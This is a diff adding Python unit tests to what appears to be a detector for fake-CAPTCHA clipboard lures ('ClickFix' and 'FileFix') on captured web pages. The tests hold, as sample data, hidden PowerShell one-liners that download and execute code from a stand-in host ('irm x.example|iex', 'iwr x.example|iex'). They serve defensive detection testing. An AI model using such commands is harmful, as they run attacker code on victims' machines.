@@ -1054,6 +1054,42 @@ def test_fake_captcha_clipboard_command_fires_and_real_captcha_is_quiet():
     assert "fake_captcha_clipboard_command" not in _hits(_cap("https://signup.example/", [real]))
 
 
+def test_cloudflare_footer_is_not_fake_captcha():
+    """R-10: every site behind Cloudflare prints its name and a Ray ID."""
+    page = _page("https://shop.example/", title="Shop",
+                 text="Performance & security by Cloudflare. Ray ID: 8a1b2c3d4e. Security check")  # noqa: E501
+    lure = build_facts(_cap("https://shop.example/", [page]))["lure"]
+    assert lure["fake_captcha"] is False
+    assert lure["verification_wording"] is False
+
+
+def test_fake_captcha_needs_an_instruction_next_to_the_wording():
+    wording = _page("https://v.example/", title="Verify you are human", text="Checking...")
+    assert build_facts(_cap("https://v.example/", [wording]))["lure"]["fake_captcha"] is False
+    told = _page("https://v.example/", title="Verify you are human",
+                 text="Press and hold the Windows key, then copy the verification code")  # noqa: E501
+    assert build_facts(_cap("https://v.example/", [told]))["lure"]["fake_captcha"] is True
+
+
+_TURNSTILE = [_req("https://challenges.cloudflare.com/turnstile/v0/api.js")]
+
+
+def test_genuine_challenge_with_plain_command_is_not_fake_captcha():
+    """R-10: a page that loaded real Turnstile, says 'verify you are human' and copies an
+    ordinary command (no Run-dialog lure, no ClickFix trait) is not a fake CAPTCHA."""
+    page = _page("https://portal.example/", title="Verify you are human", text="One moment")
+    data = _cap("https://portal.example/", [page], har=_TURNSTILE,
+                clipboard=_clip("cmd /c start calc"))  # noqa: E501
+    assert "fake_captcha_clipboard_command" not in _hits(data)
+
+
+def test_genuine_challenge_does_not_hide_an_unambiguous_command():
+    page = _page("https://portal.example/", title="Verify you are human", text="One moment")
+    data = _cap("https://portal.example/", [page], har=_TURNSTILE,
+                clipboard=_clip('powershell -w hidden -c "irm x.example|iex"'))  # noqa: E501
+    assert "fake_captcha_clipboard_command" in _hits(data)
+
+
 def test_filefix_command_disguised_as_path_fires_and_plain_command_is_quiet():
     filefix = "powershell -NoP -W Hidden -c \"iwr x.example|iex\"            # C:\\\\Users\\\\Public\\\\HRPolicy.docx"  # noqa: E501
     assert "filefix_command_disguised_as_path" in _hits(_clipcap("https://share.example/", filefix))  # noqa: E501
